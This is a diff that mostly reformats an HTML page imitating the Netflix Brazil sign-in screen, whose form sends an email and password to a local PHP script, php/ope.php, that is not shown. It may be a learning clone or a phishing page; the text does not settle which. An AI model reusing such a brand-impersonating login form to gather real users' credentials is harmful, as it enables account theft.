@@ -1,70 +1,70 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous" />
-<link rel="stylesheet" href="style/login.css">
-<meta charset="UTF-8">
-<title>Netflix</title>
+    <meta charset="UTF-8">
+    <title>Netflix</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous" />
+    <link rel="stylesheet" href="style/login.css">
 </head>
 <body>
-
-    <!-- INICIO DO FORMULÁRIO -->
+    <!-- INÍCIO DO FORMULÁRIO -->
     <header class="showcase">
-            <div class="logo">
-                <img src="https://i.ibb.co/r5krrdz/logo.png">
+        <div class="logo">
+            <img src="https://i.ibb.co/r5krrdz/logo.png" alt="Netflix Logo">
+        </div>
+        <div class="showcase-content">
+            <div class="formm">
+                <form method="POST" action="php/ope.php" id="formlogin" name="formlogin">
+                    <h1>Entrar</h1>
+                    <div class="info">
+                        <input class="email" type="email" name="login" id="login" placeholder="Email ou número de telefone"> <br>
+                        <input class="email" type="password" name="senha" id="senha" placeholder="Senha">
+                    </div>
+                    <div class="btn">
+                        <button class="btn-primary" type="submit" value="entrar" id="entrar" name="entrar">Entrar</button>
+                    </div>
+                    <div class="help">
+                        <div>
+                            <input type="checkbox" value="true"><label>Lembre-se de mim</label>
+                        </div>
+                        <a href="https://www.netflix.com/br/LoginHelp">Precisa de ajuda?</a>
+                    </div>
+                </form>
             </div>
-            <div class="showcase-content">
-                <div class="formm">
-                    <form method="POST" action="php/ope.php" id="formlogin" name="formlogin" >
-                        <h1>Entrar</h1>
-                        <div class="info">
-                            <input class="email" type="email" name="login" id="login" placeholder="Email ou número de telefone"> <br>
-                            <input class="email" type="password" name="senha" id="senha" placeholder="Senha">
-                        </div>
-                        <div class="btn">
-                            <button class="btn-primary" type="submit" value="entrar" id="entrar" name="entrar">Entrar</button>
-                        </div>
-                        <div class="help">
-                            <div>
-                                <input value="true" type="checkbox"><label>Lembre-se de mim</label>
-                            </div>
-                            <a href="https://www.netflix.com/br/LoginHelp">Precisa de ajuda?</a>
-                        </div>
-                    </form>
-                </div>
-                <div class="fcbk">
-                    <a href="https://facebook.com">
-                        <img src="https://i.ibb.co/LrVMXNR/social-fb.png" alt="Facebook">
-                      </a>
-                      <a href="https://facebook.com">
+            <div class="fcbk">
+                <a href="https://facebook.com">
+                    <img src="https://i.ibb.co/LrVMXNR/social-fb.png" alt="Facebook">
+                </a>
+                <a href="https://facebook.com">
                     <p>Login com Facebook</p>
                 </a>
-                </div>
-                <div class="signup">
-                    <p>Novo por Aqui?</p>
-                    <a href="cadastro.html">Assine Agora</a>
-                </div>
-                <div class="more">
-                    <p>
-                        Esta página é protegida pelo Google reCAPTCHA para garantir que você não é um robô. <a href="#">Saiba mais.</a> 
-                    </p>
-                </div>
             </div>
+            <div class="signup">
+                <p>Novo por Aqui?</p>
+                <a href="cadastro.html">Assine Agora</a>
+            </div>
+            <div class="more">
+                <p>
+                    Esta página é protegida pelo Google reCAPTCHA para garantir que você não é um robô. <a href="#">Saiba mais.</a> 
+                </p>
+            </div>
+        </div>
     </header>
-        <!-- FIM DO FORMULÁRIO -->
-       <!-- FOOTER -->
-       <footer>
+    <!-- FIM DO FORMULÁRIO -->
+
+    <!-- FOOTER -->
+    <footer>
         <div class="ftr-content">
             <div class="contact">
                 <a href="#">Dúvidas? Ligue 0800 591 8942.</a>
             </div>
             <div class="ftr">
                 <a href="perguntasfrq.html">Perguntas frequentes</a>
-                <a href="#centralajuda.html">Central de Ajuda</a>
+                <a href="centralajuda.html">Central de Ajuda</a>
                 <a href="termos.html">Termos de Uso</a>
-                <a href="privacidade.html">Privacidade</a> 
+                <a href="privacidade.html">Privacidade</a>
                 <a href="cookies.html">Preferências de cookies</a>
-                <a herf="empresainfo.html">Informações corporativas</a>
+                <a href="empresainfo.html">Informações corporativas</a>
             </div>
             <div class="select">
                 <select>
